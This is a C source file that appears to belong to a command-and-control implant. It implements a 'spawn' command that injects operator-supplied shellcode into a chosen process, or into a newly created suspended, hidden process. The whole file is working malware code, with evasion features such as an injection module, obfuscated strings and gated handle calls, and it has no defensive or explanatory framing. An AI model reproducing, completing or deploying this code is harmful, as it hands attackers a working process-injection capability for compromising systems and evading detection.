#include "config.h"
#ifdef INCLUDE_CMD_SPAWN

#include "commands.h"
#include "evasion/injection.h"

VOID cmd_spawn(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD pid = parser_int32(args);
    DWORD sc_len = 0;
    BYTE* sc = parser_bytes(args, &sc_len);

    if (!sc || sc_len == 0) {
        package_add_string(inst, response, XSTR("no shellcode provided"));
        response->is_error = TRUE;
        return;
    }

    if (pid != 0) {
        if (inject_shellcode(inst, pid, sc, sc_len, NULL)) {
            package_add_string(inst, response, XSTR("injected into process"));
        } else {
            package_add_string(inst, response, XSTR("injection failed"));
            response->is_error = TRUE;
        }
        return;
    }

    if (inst->Spawnto.x64[0] == '\0') {
        package_add_string(inst, response, XSTR("no spawnto path configured"));
        response->is_error = TRUE;
        return;
    }

    wchar_t wcmd[600];
    es_memset(wcmd, 0, sizeof(wcmd));
    inst->Win32.MultiByteToWideChar(0, 0, inst->Spawnto.x64, -1, wcmd, 299);

    if (inst->Spawnto.x64_args[0]) {
        int pos = 0;
        while (wcmd[pos]) pos++;
        wcmd[pos++] = L' ';
        inst->Win32.MultiByteToWideChar(0, 0, inst->Spawnto.x64_args, -1, wcmd + pos, 299);
    }

    STARTUPINFOW si;
    es_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    es_memset(&pi, 0, sizeof(pi));

    BOOL created = inst->Win32.CreateProcessW(
        NULL, wcmd, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);

    if (!created) {
        package_add_string(inst, response, XSTR("CreateProcessW failed"));
        response->is_error = TRUE;
        return;
    }

    HANDLE hThread = inject_shellcode_into(inst, pi.hProcess, sc, sc_len, NULL);
    if (!hThread) {
        inst->Win32.TerminateProcess(pi.hProcess, 1);
        gate_CloseHandle(inst, pi.hThread);
        gate_CloseHandle(inst, pi.hProcess);
        package_add_string(inst, response, XSTR("injection into spawned process failed"));
        response->is_error = TRUE;
        return;
    }

    gate_CloseHandle(inst, hThread);
    gate_CloseHandle(inst, pi.hThread);
    gate_CloseHandle(inst, pi.hProcess);

    package_add_string(inst, response, XSTR("spawned"));
}

#endif
